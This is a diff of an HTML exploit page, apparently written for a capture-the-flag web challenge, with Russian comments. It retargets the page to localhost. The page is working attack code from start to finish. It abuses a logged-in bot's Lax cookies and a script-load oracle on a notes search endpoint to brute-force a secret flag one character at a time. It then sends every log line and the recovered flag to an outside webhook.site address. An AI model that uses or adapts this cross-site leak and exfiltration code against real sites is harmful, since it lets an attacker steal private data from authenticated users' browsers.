@@ -1,56 +1,65 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>average-contrived-notes-app exploit</title>
+<title>average notes localhost exploit</title>
 <body>
-<pre id="log">bot жду здесь. Этот файл сам себя не репортит.
-Открой хостнутую страницу, потом её URL вставь в поле report url на челлендже.</pre>
+<pre id="log">Жду бота.
+Этот вариант бьёт в http://localhost:3031, а не в публичный домен.
+Оставь страницу открытой не обязательно, результат уйдёт на webhook.</pre>
 <script>
-const SITE = 'https://average-contrived-notes-app.shrimple.de';
-
-// Поменяй на свой webhook / bin / сервер для приёма флага
+const TARGET = 'http://localhost:3031';
 const EXFIL = 'https://webhook.site/8c8d42bd-7c61-4dc8-b8b0-9b439cacf9fe';
-
 const ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-!@#$%^&*()+=:,./?';
 let prefix = 'RS{';
 
 const logEl = document.getElementById('log');
-function log(s){ logEl.textContent += '\\n' + s; console.log(s); }
+function log(s){
+  logEl.textContent += '\n' + s;
+  console.log(s);
+  try { fetch(EXFIL + '?log=' + encodeURIComponent(s), {mode:'no-cors'}); } catch(e) {}
+}
 function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }
 
-function probe(guess) {
-  return new Promise(async (resolve) => {
-    const nonce = Math.random().toString(36).slice(2);
-    const url = `${SITE}/api/notes?search=${encodeURIComponent(guess)}&x=${nonce}`;
+async function topNav(url) {
+  let w = null;
+  try {
+    w = window.open(url, '_blank', 'popup,width=220,height=120');
+  } catch (e) {}
+  await sleep(2500);
+  try { if (w && !w.closed) w.close(); } catch (e) {}
+}
 
-    // 1. top-level navigation, чтобы Lax-cookie ушла и ответ положился в cache
-    const w = window.open(url, '_blank', 'popup,width=220,height=120');
-    await sleep(1800);
-    try { if (w && !w.closed) w.close(); } catch {}
-
-    // 2. тот же URL как script
-    // пустой ответ => valid empty JS => onload
-    // непустой ответ с флагом => invalid JS => onerror
+function scriptOracle(url) {
+  return new Promise((resolve) => {
     const s = document.createElement('script');
     let done = false;
-
     function finish(v) {
       if (done) return;
       done = true;
       s.remove();
       resolve(v);
     }
-
     s.onload = () => finish(false);
     s.onerror = () => finish(true);
     s.src = url;
     document.body.appendChild(s);
-
-    setTimeout(() => finish(false), 4000);
+    setTimeout(() => finish(false), 5000);
   });
 }
 
+async function probe(guess) {
+  const nonce = Math.random().toString(36).slice(2);
+
+  // сначала top-level navigation с Lax cookie бота
+  const url = `${TARGET}/api/notes?search=${encodeURIComponent(guess)}&x=${nonce}`;
+  await topNav(url);
+
+  // потом тянем тот же URL как script
+  const hit = await scriptOracle(url);
+  return hit;
+}
+
 async function brute() {
-  log('starting with ' + prefix);
+  log('start ' + prefix);
 
   while (!prefix.endsWith('}')) {
     let found = false;
@@ -59,30 +68,35 @@ async function brute() {
       const guess = prefix + ch;
       log('try ' + guess);
 
-      const ok = await probe(guess);
+      // пара попыток на один символ, чтобы сгладить кэш/тайминги
+      let ok = false;
+      for (let i = 0; i < 2; i++) {
+        if (await probe(guess)) {
+          ok = true;
+          break;
+        }
+        await sleep(500);
+      }
+
       if (ok) {
         prefix = guess;
-        log('hit => ' + prefix);
+        log('hit ' + prefix);
         found = true;
         break;
       }
-      await sleep(250);
+      await sleep(300);
     }
 
     if (!found) {
-      log('no next char found, попробуй расширить alphabet или поднять sleep');
+      log('stuck at ' + prefix);
       return;
     }
   }
 
-  log('FLAG = ' + prefix);
-
+  log('FLAG ' + prefix);
   try {
     await fetch(EXFIL + '?flag=' + encodeURIComponent(prefix), { mode: 'no-cors' });
-    log('sent to exfil');
-  } catch (e) {
-    log('exfil failed: ' + e);
-  }
+  } catch (e) {}
 }
 
 brute();
